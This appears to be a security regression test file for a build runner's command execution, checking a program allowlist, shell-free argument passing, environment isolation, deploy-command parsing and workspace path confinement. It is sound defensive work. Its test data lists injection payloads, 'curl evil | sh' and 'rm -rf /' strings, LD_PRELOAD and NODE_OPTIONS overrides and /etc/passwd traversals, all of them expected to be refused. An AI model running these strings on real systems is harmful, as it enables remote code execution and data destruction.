// Security regression tests for runner-side process execution (CodeQL js/command-line-injection,
// js/shell-command-injection-from-environment, js/indirect-command-line-injection).
// Covers: no shell on the runner host, the program allowlist, validated operator binaries, operator deploy commands
// parsed without a shell, argument/env/cwd validation, and workspace path confinement (traversal, symlink escape).

import { test } from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdirSync, symlinkSync, writeFileSync, chmodSync, readFileSync } from "node:fs";
import path from "node:path";
import { run, programOf, trustedBinary, invocationProblem, dockerImageRef, ExecPolicyError } from "../src/exec.ts";
import { parseOperatorCommand, materialize, runOperatorCommand, OperatorCommandError } from "../src/operator-command.ts";
import { resolveWithin, PathEscapeError } from "../src/paths.ts";
import { createWorkspace, findLocalWorkspace } from "../src/workspace.ts";
import { runChecks, loadStarter } from "../src/checks.ts";
import { loadManifest } from "../src/skills.ts";
import { loadConfig } from "../src/config.ts";
import { deletePreview } from "../src/job.ts";
import { silentLogger } from "../src/log.ts";
import { makeConfig, tmp, SECRET, fakeWrangler } from "./helpers.ts";

const ENV = { PATH: process.env.PATH ?? "/usr/bin:/bin", HOME: "/nonexistent", LANG: "C.UTF-8" };

// ── Program allowlist: no shell, no arbitrary executable ────────────────────────────────────────────────────────

test("[SEC-EXEC] shells, interpreters and unknown programs are refused before anything starts", async () => {
  for (const p of ["sh", "bash", "/bin/sh", "/usr/bin/bash", "dash", "zsh", "cmd", "cmd.exe", "powershell", "pwsh", "env", "xargs", "python3", "perl", "busybox", "sudo", "curl", "docker", "claude", "./node", "/usr/bin/node", "node ", "git;id", "__proto__", "constructor", "toString"]) {
    assert.equal(programOf(p), null, p);
    const r = await run(p as never, ["-c", "echo pwned"], { env: ENV });
    assert.equal(r.refused, true, `${p} refused`);
    assert.equal(r.code, 126);
    assert.doesNotMatch(r.stdout, /pwned/);
  }
  for (const p of ["git", "tar", "node", "npm", "npx", "wrangler", "bwrap", "socat"]) assert.equal(programOf(p), p);
});

test("[SEC-EXEC] command-injection payloads in arguments reach the program as literal text (no shell interpretation)", async () => {
  const dir = tmp("sec-inject-");
  const marker = path.join(dir, "pwned");
  const payloads = [
    `x; touch ${marker}`, `$(touch ${marker})`, `\`touch ${marker}\``, `| touch ${marker}`, `&& touch ${marker}`,
    `> ${marker}`, `'; touch ${marker}; '`, `\n touch ${marker}`, `$HOME`, `*`, `--version`,
  ];
  const r = await run("node", ["-e", "process.stdout.write(JSON.stringify(process.argv.slice(1)))", ...payloads], { cwd: dir, env: ENV });
  assert.equal(r.code, 0, r.stderr);
  assert.deepEqual(JSON.parse(r.stdout), payloads, "every payload arrives byte for byte as one argument");
  assert.ok(!existsSync(marker), "nothing was executed by a shell");
});

test("[SEC-EXEC] malicious invocation shapes are refused: NUL bytes, relative cwd, bad env names, oversized argv", async () => {
  assert.match(String(invocationProblem(["a\0b"], { env: ENV })), /NUL/);
  assert.match(String(invocationProblem(["ok"], { cwd: "relative/dir", env: ENV })), /absolute/);
  assert.match(String(invocationProblem(["ok"], { cwd: "/tmp\0/x", env: ENV })), /absolute/);
  assert.match(String(invocationProblem(["ok"], { env: { "BAD NAME": "x" } })), /invalid environment variable name/);
  assert.match(String(invocationProblem(["ok"], { env: { "A=B": "x" } })), /invalid environment variable name/);
  assert.match(String(invocationProblem(["ok"], { env: { OK: "x\0y" } })), /NUL-free/);
  assert.match(String(invocationProblem(["ok"], { env: undefined })), /explicit environment/);
  assert.match(String(invocationProblem(new Array(2000).fill("a"), { env: ENV })), /at most 1024/);
  assert.match(String(invocationProblem([42 as unknown as string], { env: ENV })), /string/);
  const r = await run("node", ["-e", "1", "a\0b"], { env: ENV });
  assert.equal(r.refused, true);
});

test("[SEC-EXEC] the child sees only the explicit environment, never the runner's own (secrets are not inherited)", async () => {
  process.env.SEC_TEST_RUNNER_SECRET = "runner-only-secret-000";
  try {
    const r = await run("node", ["-e", "process.stdout.write(JSON.stringify(Object.keys(process.env).sort()))"], { env: { PATH: ENV.PATH, ONLY: "1" } });
    const keys = JSON.parse(r.stdout) as string[];
    assert.ok(!keys.includes("SEC_TEST_RUNNER_SECRET"));
    assert.ok(keys.includes("ONLY"));
  } finally { delete process.env.SEC_TEST_RUNNER_SECRET; }
});

// ── Operator-configured binaries (RUNNER_DOCKER_BIN, CLAUDE_CODE_BIN, DOCKER_BIN) ──────────────────────────────

test("[SEC-EXEC] operator binary settings accept only the expected executable, never a shell or a traversal", () => {
  assert.equal(trustedBinary("docker", "docker").path, "docker");
  assert.equal(trustedBinary("claude", "claude").path, "claude");
  const dir = tmp("sec-bin-");
  const fake = path.join(dir, "docker");
  writeFileSync(fake, "#!/usr/bin/env node\n"); chmodSync(fake, 0o755);
  assert.equal(trustedBinary("docker", fake).path, fake);
  const bad = ["sh", "/bin/sh", "bash", "docker; rm -rf /", "docker --host evil", "./docker", "bin/docker", "/usr/bin/../bin/docker",
    "/usr/local/bin//docker", "/tmp/evil", path.join(dir, "notdocker"), "", "docker\n", "claude"];
  for (const v of bad) assert.throws(() => trustedBinary("docker", v), ExecPolicyError, v);
  assert.throws(() => trustedBinary("claude", "/bin/bash"), ExecPolicyError);
  // A symlink named like the expected binary that points at a shell is refused.
  const link = path.join(tmp("sec-link-"), "claude");
  symlinkSync(existsSync("/bin/sh") ? "/bin/sh" : process.execPath, link);
  if (existsSync("/bin/sh")) assert.throws(() => trustedBinary("claude", link), /shell or interpreter/);
  // A directory named docker is not an executable.
  const d = path.join(tmp("sec-dir-"), "docker"); mkdirSync(d);
  assert.throws(() => trustedBinary("docker", d), /not a regular file/);
});

test("[SEC-EXEC] loadConfig refuses shell binaries, unsafe workspace roots and shell-syntax deploy commands at startup", () => {
  const base = { LOCAL_MODEL: "qwen3-coder:30b", RUNNER_WORKSPACES: tmp("sec-cfg-ws-"), SKILLS_SOURCE_DIR: tmp("sec-cfg-skills-"), BUILD_RUNNER_SECRET: SECRET, CONTROL_PLANE_URL: "https://platform.example" };
  assert.doesNotThrow(() => loadConfig(base));
  assert.throws(() => loadConfig({ ...base, RUNNER_DOCKER_BIN: "/bin/sh" }), /docker binary/);
  assert.throws(() => loadConfig({ ...base, RUNNER_DOCKER_BIN: "docker && curl evil" }), /docker binary/);
  assert.throws(() => loadConfig({ ...base, RUNNER_AGENT_PROVIDER: "claude-code", CLAUDE_CODE_BIN: "bash" }), /removed \(Founder directive V4\)/);
  assert.throws(() => loadConfig({ ...base, RUNNER_WORKSPACES: "relative/ws" }), /RUNNER_WORKSPACES must be an absolute path/);
  assert.throws(() => loadConfig({ ...base, RUNNER_WORKSPACES: "/srv/ws/../../etc" }), /RUNNER_WORKSPACES must be an absolute path/);
  assert.throws(() => loadConfig({ ...base, PREVIEW_DEPLOY_COMMAND: "npx --yes wrangler@4.40.0 deploy; curl evil | sh" }), /PREVIEW_DEPLOY_COMMAND: shell syntax/);
  assert.throws(() => loadConfig({ ...base, PREVIEW_DELETE_COMMAND: "rm -rf /" }), /PREVIEW_DELETE_COMMAND: program must be wrangler or npx/);
  assert.ok(loadConfig({ ...base, PREVIEW_DEPLOY_COMMAND: `WRANGLER_SEND_METRICS=false npx --yes wrangler@4.40.0 deploy --name "$CRESTMONT_PREVIEW_NAME"` }).preview);
});

// ── Operator deploy commands: parsed into an allow-listed Wrangler invocation, never run by a shell ────────────

test("[SEC-EXEC] every documented deploy/delete command form parses into a structured Wrangler invocation", () => {
  const p = parseOperatorCommand("preview-deploy", `WRANGLER_SEND_METRICS=false npx --yes wrangler@4.40.0 deploy --name "$CRESTMONT_PREVIEW_NAME"`, ["CLOUDFLARE_API_TOKEN"]);
  assert.deepEqual(materialize(p, { CRESTMONT_PREVIEW_NAME: "cm-prv-prj-a-b0" }), { program: "npx", args: ["--yes", "wrangler@4.40.0", "deploy", "--name", "cm-prv-prj-a-b0"], env: { WRANGLER_SEND_METRICS: "false" } });
  const d = parseOperatorCommand("production-deploy", `CLOUDFLARE_API_TOKEN="$SITE_CLOUDFLARE_API_TOKEN" CLOUDFLARE_ACCOUNT_ID="$SITE_CLOUDFLARE_ACCOUNT_ID" WRANGLER_SEND_METRICS=false npx --yes wrangler@4.40.0 deploy`, ["SITE_CLOUDFLARE_API_TOKEN", "SITE_CLOUDFLARE_ACCOUNT_ID"]);
  const m = materialize(d, { SITE_CLOUDFLARE_API_TOKEN: "tok en;$(x)", SITE_CLOUDFLARE_ACCOUNT_ID: "0".repeat(32) });
  assert.deepEqual(m.args, ["--yes", "wrangler@4.40.0", "deploy"]);
  assert.equal(m.env.CLOUDFLARE_API_TOKEN, "tok en;$(x)", "credential values go to the environment verbatim, never to argv or a shell");
  const del = parseOperatorCommand("preview-delete", `wrangler delete --name=$CRESTMONT_PREVIEW_NAME --force`);
  assert.deepEqual(materialize(del, { CRESTMONT_PREVIEW_NAME: "cm-prv-x-b1" }).args, ["delete", "--name=cm-prv-x-b1", "--force"]);
});

test("[SEC-EXEC] deploy command settings with shell syntax, other programs, unpinned packages or config overrides are refused", () => {
  const refuse: [string, RegExp][] = [
    ["wrangler deploy; curl https://evil", /shell syntax/],
    ["wrangler deploy && rm -rf /", /shell syntax/],
    ["wrangler deploy | tee /tmp/x", /shell syntax/],
    ["wrangler deploy > /tmp/x", /shell syntax/],
    ["wrangler deploy $(curl evil)", /variable reference/],
    ["wrangler deploy `id`", /shell syntax/],
    [`wrangler deploy --name "\`id\`"`, /backticks/],
    [`wrangler deploy --name "$(id)"`, /variable reference/],
    ["wrangler deploy\ncurl evil", /shell syntax/],
    ["wrangler deploy --name $HOME", /only CRESTMONT_PREVIEW_NAME/],
    ["wrangler deploy --name $CLOUDFLARE_API_TOKEN", /only CRESTMONT_PREVIEW_NAME/],
    ["sh -c 'wrangler deploy'", /program must be wrangler or npx/],
    ["bash deploy.sh", /program must be wrangler or npx/],
    ["node deploy.mjs", /program must be wrangler or npx/],
    ["npm run deploy", /program must be wrangler or npx/],
    ["/usr/bin/wrangler deploy", /program must be wrangler or npx/],
    ["npx --yes evil-package deploy", /exact Wrangler version/],
    ["npx --yes wrangler deploy", /exact Wrangler version/],
    ["npx --yes wrangler@latest deploy", /exact Wrangler version/],
    ["npx -p evil wrangler@4.0.0 deploy", /exact Wrangler version/],
    ["wrangler secret put X", /only "wrangler deploy"/],
    ["wrangler deploy --config /run/secrets/wrangler.json", /--config is not allowed/],
    ["wrangler deploy -c other.toml", /-c is not allowed/],
    ["wrangler deploy --assets /run/secrets", /--assets is not allowed/],
    ["wrangler deploy --site ../..", /--site is not allowed/],
    ["wrangler deploy src/evil.js", /positional argument/],
    ["PATH=/tmp/evil wrangler deploy", /may not set PATH/],
    ["LD_PRELOAD=/tmp/x.so wrangler deploy", /may not set LD_PRELOAD/],
    ["NODE_OPTIONS=--require=/tmp/x.js wrangler deploy", /may not set NODE_OPTIONS/],
    ["CRESTMONT_PREVIEW_NAME=x wrangler deploy", /may not set CRESTMONT_PREVIEW_NAME/],
    ["WRANGLER_X=$HOME wrangler deploy", /not provided to this command/],
    ["", /is empty/],
    ["'unterminated", /unterminated single quote/],
  ];
  for (const [cmd, why] of refuse) assert.throws(() => parseOperatorCommand("preview-deploy", cmd, ["CLOUDFLARE_API_TOKEN"]), (e: unknown) => e instanceof OperatorCommandError && why.test(e.message), cmd);
  // A hostile runtime value (e.g. a platform-supplied name) is never passed as an argument.
  const p = parseOperatorCommand("preview-delete", `wrangler delete --name "$CRESTMONT_PREVIEW_NAME"`);
  for (const v of ["x; touch /tmp/pwn", "--config=/etc/passwd", "../../x", "a b", "", "$(id)"]) assert.throws(() => materialize(p, { CRESTMONT_PREVIEW_NAME: v }), /not a plain identifier/, v);
});

test("[SEC-EXEC] a refused deploy command never executes: delete with shell syntax reports a refusal and leaves no trace", async () => {
  const dir = tmp("sec-del-");
  const marker = path.join(dir, "pwned");
  const bin = fakeWrangler(`require('fs').writeFileSync(${JSON.stringify(path.join(dir, "ran"))}, 'x')`);
  const cfg = { ...makeConfig({ controlPlaneUrl: "http://cp.invalid", skillsSourceDir: "x", agentPath: bin.agentPath }), previewDelete: { mode: "command" as const, command: `wrangler delete --name "$CRESTMONT_PREVIEW_NAME"; touch ${marker}`, timeoutMs: 10_000 } };
  const r = await deletePreview(cfg, "cm-prv-prj-a-b0", { PATH: ENV.PATH });
  assert.equal(r.ok, false);
  assert.match(String(r.error), /delete command refused: .*shell syntax/);
  assert.ok(!existsSync(marker) && !existsSync(path.join(dir, "ran")));
  const r2 = await runOperatorCommand("preview-deploy", "node -e 'require(\"fs\").writeFileSync(\"/tmp/x\",\"\")'", [], { PATH: ENV.PATH }, { cwd: dir, timeoutMs: 5_000 });
  assert.equal(r2.refused, true);
  assert.equal(r2.code, 126);
});

// ── Paths: workspace confinement, traversal and symlink escapes ─────────────────────────────────────────────────

test("[SEC-EXEC] resolveWithin rejects traversal, unrelated absolute paths and symlink escapes", () => {
  const root = tmp("sec-root-");
  mkdirSync(path.join(root, "a", "b"), { recursive: true });
  assert.equal(resolveWithin(root, "a/b/file.tgz"), path.join(root, "a", "b", "file.tgz"));
  assert.equal(resolveWithin(root, path.join(root, "a")), path.join(root, "a"));
  for (const bad of ["../x", "a/../../x", "/etc/passwd", "/tmp", `${root}-sibling/x`, "a/b/../../../etc"]) assert.throws(() => resolveWithin(root, bad), PathEscapeError, bad);
  assert.throws(() => resolveWithin("relative", "x"), PathEscapeError);
  assert.throws(() => resolveWithin(root, "a\0b"), PathEscapeError);
  const outside = tmp("sec-outside-");
  symlinkSync(outside, path.join(root, "escape"));
  assert.throws(() => resolveWithin(root, "escape/secret.txt"), /symbolic link/);
  assert.throws(() => resolveWithin(root, "escape"), /symbolic link/);
});

test("[SEC-EXEC] control-plane job fields cannot steer workspace paths: attempt and id are reduced to plain segments", () => {
  const root = tmp("sec-ws-");
  for (const attempt of ["../../etc" as unknown as number, -1, 1.5, Number.NaN, "1; rm -rf /" as unknown as number, 1e12]) {
    assert.throws(() => createWorkspace(root, { id: "bld_1", attempt }), /invalid job attempt/, String(attempt));
  }
  const ws = createWorkspace(root, { id: "../../../etc/passwd;$(id)", attempt: 2 });
  assert.equal(path.dirname(ws.dir), root, "stays directly under the root");
  assert.match(ws.ref, /^[A-Za-z0-9_-]+$/);
  assert.throws(() => createWorkspace("relative-root", { id: "bld_1", attempt: 1 }), /absolute/);
});

test("[SEC-EXEC] resuming a job refuses workspace refs that are traversals or symlinks out of the root", () => {
  const root = tmp("sec-resume-");
  const outside = tmp("sec-resume-out-");
  symlinkSync(outside, path.join(root, "planted"));
  assert.equal(findLocalWorkspace(root, "planted"), null);
  assert.equal(findLocalWorkspace(root, "../x"), null);
  assert.equal(findLocalWorkspace(root, "/etc"), null);
  const ws = createWorkspace(root, { id: "bld_ok", attempt: 1 });
  assert.equal(findLocalWorkspace(root, ws.ref)?.dir, ws.dir);
});

// ── Repository / configuration content cannot pick executables ──────────────────────────────────────────────────

test("[SEC-EXEC] acceptance checks and tool checks only start allow-listed programs", async () => {
  const repo = tmp("sec-checks-");
  const marker = path.join(repo, "pwned");
  const out = await runChecks(repo, [{ id: "evil", label: "evil", command: ["sh", "-c", `touch ${marker}`] }, { id: "ok", label: "ok", command: ["node", "-e", "0"] }], ENV, 10_000);
  assert.equal(out[0].ok, false);
  assert.match(out[0].outputTail, /not an allow-listed program/);
  assert.equal(out[1].ok, true);
  assert.ok(!existsSync(marker));

  const starter = tmp("sec-starter-");
  writeFileSync(path.join(starter, "starter.json"), JSON.stringify({ schema: "crestmont.starter/1", name: "x", version: "1", description: "", packages: {}, acceptance: [{ id: "a", label: "a", command: ["bash", "-c", "id"] }] }));
  assert.throws(() => loadStarter(starter), /must start with an allow-listed program/);

  const manifestFile = path.join(tmp("sec-manifest-"), "manifest.json");
  const real = JSON.parse(readFileSync(path.resolve(import.meta.dirname, "..", "skills", "manifest.json"), "utf8"));
  real.tools.git = { command: ["/bin/sh", "-c", "id"] };
  writeFileSync(manifestFile, JSON.stringify(real));
  assert.throws(() => loadManifest(manifestFile), /Tool git: the check command must start with an allow-listed program/);
});

// ── Claude Code sessions and CI command-line inputs ─────────────────────────────────────────────────────────────

// The V3 Claude Code CLI provider (and its session-id/binary test) was removed by Founder directive V4.

test("[SEC-EXEC] CI scripts accept only Docker image references from their command line", () => {
  for (const ok of ["crestmont-ai-runner:ci", "ghcr.io/org/img:1.2.3", "img@sha256:" + "a".repeat(64), "localhost:5000/x/y:tag"]) assert.equal(dockerImageRef(ok), ok);
  for (const bad of ["--privileged", "-v/:/host", "img;id", "img $(id)", "../img", "IMG", "", "a//b", "img:tag:tag"]) assert.throws(() => dockerImageRef(bad), ExecPolicyError, bad);
});
